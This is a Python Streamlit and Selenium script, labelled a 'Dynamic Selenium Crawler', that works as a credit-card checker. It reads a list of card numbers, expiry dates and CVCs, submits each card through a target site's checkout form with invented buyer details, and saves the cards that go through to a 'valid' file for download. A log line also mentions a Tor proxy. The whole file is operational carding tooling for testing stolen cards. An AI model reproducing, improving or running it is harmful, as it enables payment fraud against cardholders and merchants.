import os
import time
import logging
import random
import json
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import WebDriverException, TimeoutException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime
import streamlit as st
import base64
from pathlib import Path
import stat

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Persons Dict that have more than 1 user data
persons = {
    "John Doe": {
        "name": "John Doe",
        "email": "johndoe@gmail.com",
        "phone": "1234567890",
        "street": "10 Main St",
        "city": "New York",
        "state": "NY",
        "postal": "10001"
    },
    "Jane Doe": {
        "name": "Jane Doe",
        "email": "janedoe@icloud.com",
        "phone": "0987654321",
        "street": "11 Main St",
        "city": "New York",
        "state": "NY",
        "postal": "15041"
    }
}
# Explicitly set the driver version
#set path to the driver
CHROME_DRIVER_PATH = Path("drivers") / "chromedriver"


def setup_driver():
    try:
        # Set execution permissions to the chromedriver
        CHROME_DRIVER_PATH.chmod(CHROME_DRIVER_PATH.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        options = webdriver.ChromeOptions()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        prefs = {"profile.managed_default_content_settings.images": 2}
        options.add_experimental_option("prefs", prefs)

        service = Service(executable_path=str(CHROME_DRIVER_PATH))
        driver = webdriver.Chrome(service=service, options=options)

        logging.info("ChromeDriver setup successfully with Tor proxy.")
        return driver
    except WebDriverException as e:
        logging.error(f"Error setting up ChromeDriver: {e}")
        return None

def load_data(data_file):
  if data_file:
      try:
           lines = [line.decode() for line in data_file.readlines()]
           return lines
      except Exception as e:
           st.error(f"Error decoding data file : {e}")
           return None
  else:
      return None

def load_cc_data(cc_file):
    if cc_file:
        try:
             lines = [line.decode() for line in cc_file.readlines()]
             return lines
        except Exception as e:
             st.error(f"Error decoding cc file : {e}")
             return None
    else:
        return None


def get_by_type(target_type):
    if target_type == "id":
        return By.ID
    elif target_type == "name":
        return By.NAME
    elif target_type == "class":
        return By.CLASS_NAME
    elif target_type == "css":
        return By.CSS_SELECTOR
    elif target_type == "xpath":
        return By.XPATH
    else:
        raise ValueError(f"Unsupported target type: {target_type}")


def get_wait_condition(wait_condition):
    if wait_condition == "presence_of_element_located":
        return EC.presence_of_element_located
    elif wait_condition == "element_to_be_clickable":
        return EC.element_to_be_clickable
    elif wait_condition == "presence_of_all_elements_located":
        return EC.presence_of_all_elements_located
    elif wait_condition == "text_to_be_present_in_element":
        return EC.text_to_be_present_in_element
    else:
        raise ValueError(f"Unsupported wait condition: {wait_condition}")


def execute_step(driver, step, persons, cc_data, working_ccs):
    action = step.get("action")
    target_type = step.get("target_type")
    target = step.get("target")
    input_data = step.get("input_data")
    wait_condition = step.get("wait_condition")
    frame_id = step.get("frame_id")
    wait_time = step.get("wait_time", 20)  # set default wait time to 10 secs if not provided
    check_type = step.get("check_type")
    check_text = step.get("check_text")
    current_cc = cc_data

    if wait_condition:
        wait_condition_func = get_wait_condition(wait_condition)
        by_type = get_by_type(target_type)

    if frame_id:
        try:
            frame_element = WebDriverWait(driver, wait_time).until(
                EC.presence_of_element_located((get_by_type(target_type), frame_id))
            )
            driver.switch_to.frame(frame_element)
            logging.info(f"Switched to frame: {frame_id}")
        except Exception as e:
            logging.error(f"Error while switching to frame {frame_id} : {e}")
            return

    try:

        if action == "navigate":
            driver.get(target)
            logging.info(f"Navigated to: {target}")

        elif action == "click":
            if wait_condition:
                element = WebDriverWait(driver, wait_time).until(
                    wait_condition_func((by_type, target))
                )
                element.click()
                logging.info(f"Clicked element: {target}")
            else:
                element = driver.find_element(get_by_type(target_type), target)
                element.click()
                logging.info(f"Clicked element: {target}")

        elif action == "input":
            if wait_condition:
                element = WebDriverWait(driver, wait_time).until(
                    wait_condition_func((by_type, target))
                )
                if isinstance(input_data, str) and input_data.startswith("person."):
                    data_key = input_data.split(".")[1]
                    person = random.choice(list(persons.values()))
                    element.send_keys(person.get(data_key, ""))
                    logging.info(f"Input: {data_key} from person data into element: {target}")
                elif isinstance(input_data, str) and input_data.startswith("cc."):
                   
                    data_key = input_data.split(".")[1]
                    if isinstance(current_cc, list):
                       cc = current_cc[0].split("|")
                    else:
                      cc = current_cc.split("|")
                    logging.info(f"CC: {cc} ")
                    if data_key == "number":
                        element.send_keys(cc[0])
                    elif data_key == "exp":
                        element.send_keys(cc[1] + cc[2])
                    elif data_key == "cvc":
                        element.send_keys(cc[3])
                    else:
                        element.send_keys(input_data)
                    logging.info(f"Input {data_key} from credit card data into element: {target}")
                elif input_data:
                    element.send_keys(input_data)
                    logging.info(f"Input '{input_data}' into element: {target}")
            else:
                element = driver.find_element(get_by_type(target_type), target)
                if isinstance(input_data, str) and input_data.startswith("person."):
                    data_key = input_data.split(".")[1]
                    person = random.choice(list(persons.values()))
                    element.send_keys(person.get(data_key, ""))
                    logging.info(f"Input: {data_key} from person data into element: {target}")
                elif isinstance(input_data, str) and input_data.startswith("cc."):
                    if isinstance(current_cc, list):
                       cc = current_cc[0].split("|")
                    else:
                      cc = current_cc.split("|")
                    data_key = input_data.split(".")[1]
                    if data_key == "number":
                        element.send_keys(cc[0])
                    elif data_key == "exp":
                        mm = cc[1].replace("20", "")
                        element.send_keys(mm)
                    elif data_key == "cvc":
                        element.send_keys(cc[3])
                    else:
                        element.send_keys(input_data)

                    logging.info(f"Input {data_key} from credit card data into element: {target}")
                elif input_data:
                    element.send_keys(input_data)
                    logging.info(f"Input '{input_data}' into element: {target}")

        elif action == "switch_frame":
            try:
                driver.switch_to.default_content()
                iframe_element = WebDriverWait(driver, wait_time).until(
                    EC.presence_of_element_located((get_by_type(target_type), target))
                )
                driver.switch_to.frame(iframe_element)
                logging.info(f"Switched to frame: {target}")
            except Exception as e:
                logging.error(f"Error while switching to frame {target} : {e}")

        elif action == "switch_to_default":
            driver.switch_to.default_content()
            logging.info("Switched to default content")

        elif action == "get_elements_and_click":
            if wait_condition:
                elements = WebDriverWait(driver, wait_time).until(
                    wait_condition_func((by_type, target))
                )
                if elements:
                    elements[0].click()
                    logging.info(f"Clicked element: {target}")
            else:
                elements = driver.find_elements(get_by_type(target_type), target)
                if elements:
                    elements[0].click()
                    logging.info(f"Clicked element: {target}")

        elif action == "check_card":
            if check_type == "click":
                try:
                    element = WebDriverWait(driver, wait_time).until(
                        wait_condition_func((by_type, target))
                    )
                    element.click()
                    logging.info(f"Card works clicked on element: {target}")
                    if isinstance(current_cc, list):
                        working_ccs.append(current_cc[0])
                    else:
                        working_ccs.append(current_cc)
                except TimeoutException:
                    logging.info(f"Card does not work: {target}")
            elif check_type == "text":
                try:
                    element = WebDriverWait(driver, wait_time).until(
                        wait_condition_func((by_type, target), check_text)
                    )
                    if element:
                        logging.info(f"Card works text found: {target}")
                        if isinstance(current_cc, list):
                            working_ccs.append(current_cc[0])
                        else:
                            working_ccs.append(current_cc)
                    else:
                        logging.info(f"Card does not work text not found: {target}")
                except TimeoutException:
                    logging.info(f"Card does not work: {target}")

    except WebDriverException as e:
        logging.error(f"Error executing action '{action}' on target '{target}': {e}")

    if frame_id:
        driver.switch_to.default_content()

def download_file(file_path, file_name):
    with open(file_path, 'rb') as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    href = f'<a href="data:file/txt;base64,{b64}" download="{file_name}">Download {file_name} File</a>'
    st.markdown(href, unsafe_allow_html=True)


def main():
    st.title("Dynamic Selenium Crawler")
    config_file = st.file_uploader("Upload Configuration File (config.json)", type=["json"])
    cc_file = st.file_uploader("Upload Credit Card Data (cc.txt)", type=["txt"])
    data_file = st.file_uploader("Upload Data File (data.txt)", type=["txt"])
    url = st.text_input("Enter URL to navigate (optional, else start_url from config is used)")


    if st.button("Start Crawling"):
        if not config_file:
            st.error("Please upload a configuration file.")
            return
        if not cc_file:
           st.error("Please upload credit card data file.")
           return


        try:
            config = json.load(config_file)
        except json.JSONDecodeError:
            st.error("Error decoding JSON file.")
            return
        if not url :
          url = config.get("start_url")
        if not url :
             st.error("Please provide a URL to navigate to, or set the start_url on the config file")
             return

        cc_data = load_cc_data(cc_file)
        data = load_data(data_file)

        if not cc_data :
           st.error("Please check the credit card data file, it must contain credit cards info")
           return
        # Ensure driver exists for local usage
        if not os.path.exists(str(CHROME_DRIVER_PATH)):
             logging.info("ChromeDriver is not available, downloading..")
             ChromeDriverManager().install()
        driver = setup_driver()
        if not driver:
            st.error("Failed to set up the webdriver")
            return

        working_ccs = []
        not_working_ccs = []
        progress_bar = st.progress(0)
        num_cards = len(cc_data)
        try:
           for i,cc in enumerate(cc_data):
            driver.get(url)
            for step in config["steps"]:
                execute_step(driver, step, persons, [cc], working_ccs)
            driver.delete_all_cookies()
            progress_bar.progress((i + 1) / num_cards)


           not_working_ccs = [cc for cc in cc_data if cc not in working_ccs]
           timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
           valid_file = f"valid-{timestamp}.txt"
           not_valid_file = f"notWorking-{timestamp}.txt"
           results_dir = "results"
           os.makedirs(results_dir, exist_ok=True)

           valid_path = os.path.join(results_dir,valid_file)
           not_valid_path = os.path.join(results_dir,not_valid_file)
           if working_ccs:
               with open(valid_path, "w") as f:
                   f.write("\n".join(working_ccs))
               logging.info(f"Working credit cards saved to: {valid_file}")
               st.success(f"Working credit cards saved to: {valid_file}")
           else:
               st.warning("No working credit cards found")

           if not_working_ccs:
               with open(not_valid_path, "w") as f:
                    f.write("\n".join(not_working_ccs))
               logging.info(f"Not working credit cards saved to: {not_valid_file}")
               st.info(f"Not working credit cards saved to: {not_valid_file}")
           else:
               st.warning("No not working credit cards found")

           st.markdown("### Download results :")
           if working_ccs:
            download_file(valid_path,valid_file)
           if not_working_ccs:
             download_file(not_valid_path,not_valid_file)
           st.success("Crawling completed!")
        except Exception as e:
          st.error(f"An error occured : {e}")
        finally:
           driver.quit()
           logging.info("ChromeDriver closed.")


if __name__ == "__main__":
    main()
